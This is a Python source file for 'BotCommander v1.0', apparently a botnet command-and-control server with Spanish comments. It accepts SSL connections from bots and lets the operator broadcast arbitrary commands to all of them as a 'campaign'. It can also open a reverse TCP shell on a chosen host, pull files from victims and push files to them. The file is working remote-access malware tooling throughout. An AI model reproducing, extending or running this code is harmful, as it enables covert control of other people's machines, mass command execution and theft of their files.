# -*- coding: utf-8 -*-

import socket
from _thread import *
import SSL_module
from art import tprint
from colorama import Fore, Style
import os
import psutil  #necesary pip install psutil
import time
import threading
  
def launch_campaign(command):
    
    for i in range(len(hosts)):
       start_new_thread(start_comunication,(hosts[i],command)) 
        
    
def start_comunication(host,command):
    
    host.send('execute'.encode())
    try:
        print(host.recv(BUFFER_SIZE).decode())
        host.send(command.encode())
    except socket.timeout as e:
        print(str(e))
        print("Conection lost with the host")
        return

    try:
        response = host.recv(BUFFER_SIZE).decode()
        
        print("\n\n----------------------------------------------------------------\n")
        print("***************************Host Output:************************:\n")
        print("----------------------------------------------------------------\n")
        print(response)
    except socket.timeout as e:
       print(str(e))
       return
   
    
def get_sys_info(stop_event):
    
    sys_info = ''
    #print("\n")
    while not stop_event.is_set():
        cpu_usage = psutil.cpu_percent()
        memory_usage = psutil.virtual_memory()[2]
        sys_info = "\rCPU Usage: {} % |--------------| Memory Usage: {} %".format(cpu_usage, memory_usage)
        print(sys_info, end="\r")
        time.sleep(2)

def system_monitor():
    
    stop_event = threading.Event()
    sys_info_thread = threading.Thread(target=get_sys_info, args=(stop_event,))

    try:
        sys_info_thread.start()
    except threading.ThreadError as e:
        print("An error occurred while starting the system info thread:")
        print(str(e))
    
    print("\n\nPress Any key for return to main menu")
    input()
    print("\nClosing...")
    stop_event.set()
    sys_info_thread.join()

def add_host(Client_SSL,Client_address):
    
     hosts.append(Client_SSL)
     hostsAdress.append(Client_address)
     
def accept_conections():
    
    while True:
        try:
            Client, Client_address = ServerSideSocket.accept()    # esto es un hilo bloqueante a bajo nivel
        except socket.error as e:
            ServerSideSocket.close()
            exit()
            
        Client.settimeout(2)  # si se supera el timeout, asumimos que es el fin del mensaje, sientete libre de cambiar su valor
        Client_SSL = SSL_module.create_SSL_conection(Client) #le pasamos al modulo ssl el socket del cliente para que lo tunelice en socket ssl
        #añade el host a la lista de hosts
        add_host(Client_SSL,Client_address) # se añaden los datos del host a la lista
        
        print("\n\nNew client conected ;) "+str(Client_address)+"\n")
        
def close_all_conections():
    
    print("Killing All Conections...")
    for i in range(len(hosts)):
        hosts[i].send('close-conection'.encode()) #notifica a los clientes el cierre de la conexión
        hosts[i].close()

def verify_conections():
    
    if(len(hosts)==0):
        return
    else:
        print("Checking conections ...")
        for i in range(len(hosts)):
                
            try: #test the conection with the host
                hosts[i].settimeout(2.5)
                hosts[i].send('system-data'.encode())
                try:
                    data=hosts[i].recv(BUFFER_SIZE).decode()
                    if not data:
                        hosts.remove(hosts[i])
                        del hostsAdress[i]
                        
                except socket.timeout as e:
                    # El cliente se ha desconectado inesperadamente debido al tiempo de espera
                    print(f"Lost Conection: {hostsAdress[i]} ")
                    hosts.remove(hosts[i])
                    del hostsAdress[i]
                    #print(e)
                        
                except ssl.SSLError as e:
                    hosts.remove(hosts[i])
                    print(e+str(hostsAdress))
                    del hostsAdress[i]
                    
                    
                except Exception as e:
                    hosts.remove(hosts[i])
                    del hostsAdress[i]
                    print(e)                
                
                
            except socket.error as e:
                
                hosts.remove(hosts[i])
                del hostsAdress[i] 
                print(e)
                
            except socket.timeout as e:
                hosts.remove(hosts[i])
                del hostsAdress[i] 
                print(e)
          
def server_listen():
    
    global sys_info
    
    try:
        
        ServerSideSocket.listen(5)
        start_new_thread(accept_conections,())
        tprint('BotCommander\n v1.0')
        print("Remote Machines Controller server")
        print(Fore.MAGENTA + 'Powered by CSM\u00A9'+ Style.RESET_ALL)
        print(Fore.CYAN + 'Server Socket is listening...'+ Style.RESET_ALL)  
        
    except socket.error as e:
        ServerSideSocket.close()
        exit()
   
    
    while True:
        
        
        print(Fore.GREEN +str(len(hosts))+' Bots Connected'+ Style.RESET_ALL)
        r = input("\n\n\tMain\n------------------------------------------------\n\n \n [1]. Launch Campaign (Execute multidifusion Remote Command) \n [2]. Open Reverse TCP Shell host \n [3]. Download remote file from host \n [4]. Upload file to remote Host \n [5]. System Monitor \n [0]. Exit? \n")
        
        
        if(r=='0'):
            close_all_conections()
            ServerSideSocket.close()
            break
        if(r=='1'): #send multidifusion command 
        
            verify_conections()   
            if (len(hosts)==0):
                print("\n<< None devices conected >>")
                input()
            else:    
                command = input("Enter the remote command thats you want execute in Botnet\n")
                launch_campaign(command)
            
        if(r=='2'): #open reverse shell
            #show list of hosts
            election = show_list_hosts()
            if (election != -1):
                #send reverse command to client
                hosts[election].send('reverse'.encode())
                #execute reverse shell function
                establish_reverse_TCP(hosts[election])
               
                   
        if (r == '3'): #download a file from remote host
            election = show_list_hosts()
            if (election != -1):
                #send reverse command to client
                hosts[election].send('download-file'.encode())
                
                #execute download remote file function
                download_remote_file(hosts[election])
                
        if (r == '4'):
            election = show_list_hosts()
            if (election != -1):
                #send reverse command to client
                hosts[election].send('upload-file'.encode())
                #execute download remote file function
                upload_file_host(hosts[election])
        if (r == '5'):
            
            system_monitor()
     
    ServerSideSocket.close()

def download_remote_file(host):
      
    w_sep = '\\'
    l_sep = '/'
    file_name = ''
    
    
    try:
        ready = host.recv(BUFFER_SIZE).decode() #receive ready flag from host
    
    except socket.timeout as e:
        print(str(e))
        print("\nConection lost with the host")
        
        
    if (ready == '<<Ready>>'):
        
        remote_path_file = input('\nIntroduce the Remote file path (absolute path)').replace('\\','\\')
        
        if (w_sep in remote_path_file):     # if is a path for windows..
            file_name = remote_path_file.split(w_sep)[-1]
            
        if (l_sep in remote_path_file):      # if is a path for linux   
            file_name = remote_path_file.split(l_sep)[-1]
            
        
        while True:
            local_path_file = input('\nIntroduce the local directory for save the file (absolute path)\n ej:  C:\\user\\myfolder  or  /user/myfolder ').replace('\\','\\')
            
            if not os.path.exists(local_path_file):
                print(local_path_file + "\nNot Found")
            else:
                #build the complete local path
                if (w_sep in local_path_file): 
                    local_path_file = local_path_file + w_sep +file_name
                if (l_sep in local_path_file): 
                    local_path_file = local_path_file + l_sep +file_name
                
                break
            
        
            
        host.send(remote_path_file.encode())     #sends the remote path file
        
        with open(local_path_file, 'wb') as archivo:
            print(Fore.MAGENTA + '\nDonwloading... '+file_name+ Style.RESET_ALL)
            while True:
                try:
                    data = host.recv(1024)
                    if not data:
                        break
                except socket.timeout: # si entra en el timeout es el final del mensaje
                    break
                
                archivo.write(data)
            
            print("\nFile saved")
            return
    else:
        print("\nFail, Something was wrong")
        return

def upload_file_host(host):   
     
    w_sep = '\\'
    l_sep = '/'
    file_name = ''
    
    
    try:
        ready = host.recv(BUFFER_SIZE).decode() #receive ready flag from host
    
    except socket.timeout as e:
        print(str(e))
        print("\nConection lost with the host")
        
    if (ready == '<<Ready>>'):
        
        while True:
            local_path_file = input('\nIntroduce the local Path file to upload (absolute path)\n ej:  C:\\user\\myfolder\\myfile.txt  or  /user/myfolder/myfile.txt ').replace('\\','\\')
            
            if not os.path.exists(local_path_file):
                print(local_path_file + "\nNot Found")
            else:
                break
        
        remote_path_file = input('\nIntroduce the Remote directory for save the file (absolute path)\n ej:  C:\\user\\myfolder  or  /user/myfolder ').replace('\\','\\')
        host.send(remote_path_file.encode()) #sends the path for check it
        
        try:
            found = host.recv(BUFFER_SIZE).decode() #receive ready flag from host
    
        except socket.timeout as e:
            print(str(e))
            print("\nConection lost with the host")
            return
        
        if (found == 'not-found'):
            print("\n the folder path not exists in remote host")
            return
        
        if (found == 'found'): 
            
            
            #get the filename from absolute path
            if (w_sep in local_path_file):     # if is a path for windows..
                file_name = local_path_file.split(w_sep)[-1]
                
            
            if (l_sep in local_path_file):      # if is a path for linux   
                file_name = local_path_file.split(l_sep)[-1]
                
            
            if (w_sep in remote_path_file):
                remote_path_file = remote_path_file + w_sep + file_name 
            if (l_sep in remote_path_file):
                remote_path_file = remote_path_file + l_sep + file_name
                
            host.send(remote_path_file.encode())
            
            with open(local_path_file, 'rb') as file:
                
                print(Fore.MAGENTA + '\nUploading... '+file_name+' in'+remote_path_file+ Style.RESET_ALL)
                # Leer los datos del archivo y enviarlos al cliente
                data = file.read(1024)
                
                while data:
                    
                    host.send(data)
                    data = file.read(1024)
                
                print("\nFile Uploaded")
            return
            
        

            
      
def show_list_hosts():
    
    verify_conections()
    print("\n\nDevices Conected")
    print("----------------------------------\n")
    
    if (len(hosts)==0):
        print("\n<< None devices conected >>")
        input()
        return -1
    else:
        
        for i in range(len(hosts)):
            print(f"\n{i}. {hostsAdress[i]}")    
            try: 
                hosts[i].send('system-data'.encode())  
                sysData=hosts[i].recv(BUFFER_SIZE).decode() 
                print(sysData+"\n")
            except socket.error as e:
                print(e)
            except socket.timeout as e:
                print(e)
                  
        election = int(input("Choose one host of the list (0-n)\n\n"))
        
        if isinstance(election, int) and (election < len(hosts)) and (election >= 0):  
            print(str(hostsAdress[election])+"  Ok.  Selected Host.\n\n")
            return election
        else:
            print("\n ERROR, select a valid host")
            return -1
    

def establish_reverse_TCP(client_socket):
    
    # receiving the current working directory of the client
    try:
        cwd = client_socket.recv(BUFFER_SIZE).decode()      #obtiene el mensaje del cliente teniendo en cuenta el tamaño del buffer
        if (cwd==''): print("\nConnection lost!!  Exiting..."); hosts.remove(client_socket); return 
        print("\n[+] Current working directory:", cwd)
    except socket.timeout:
        print("Error, Connection has been closed by host\n")
        return
    
    while True:
        results = ''
        data=''
        # pide por consola, el comando que quieres ejecutar remotamente
        command = input(f"{cwd} $> ")
        if not command.strip():
            # empty command
            continue
        # manda el comando al cliente
       
        if command.lower() == "exit":            
            # es necesario avisar al cliente de que se sale de la reverse shell
            client_socket.send('exit'.encode())
            return
        # recive la salida del comando ejecutado en el cliente
        # problema detectado cuando la salida sobrepasa el tamaño del buffer
        # solucion ? buffer dinámico o timeout
        data = ''
        client_socket.send(command.encode())
        
        try:
            while True:
                #print("Recovering data from client, wait...")
                try:  
                    output = client_socket.recv(BUFFER_SIZE).decode()
                    if not output:  # if not data, out the loop
                        break
                    data = data + output
                except socket.timeout:
                    break     # si salta timeout, es el final del mensaje
                    
                
        except socket.error as message: 
            print('socket.error - ' + str(message))
        
        try:
            print("Formating data resources...")
            results, cwd = data.split(SEPARATOR)
        except ValueError as e:
            
            print("An error ocurred formatting the message\n")
            print(e)
        
        
        # imprime la salida del comando
        print("\n------------------------------OUTPUT-------------------------------------------\n")
        print(results) 
        
    
    


if __name__ == "__main__":

    #-------------GLOBALS----------------------------------------------
    ServerSideSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '10.0.2.5' # your local interface   
    port = 4566
    print("Serving on:  "+host + ":"+str(port))
    BUFFER_SIZE = 1024*128
    hosts=[] #almacena los objetos sockets de cada bot (necesario para mandar y recibir)
    hostsAdress=[] #almacena las direcciones ip de los bots
    SEPARATOR = "<Sep>"
    
    try:
        ServerSideSocket.bind((host, port))
    except socket.error as e:
        print(str(e))
        ServerSideSocket.close()
        exit()
    server_listen()  
    
    
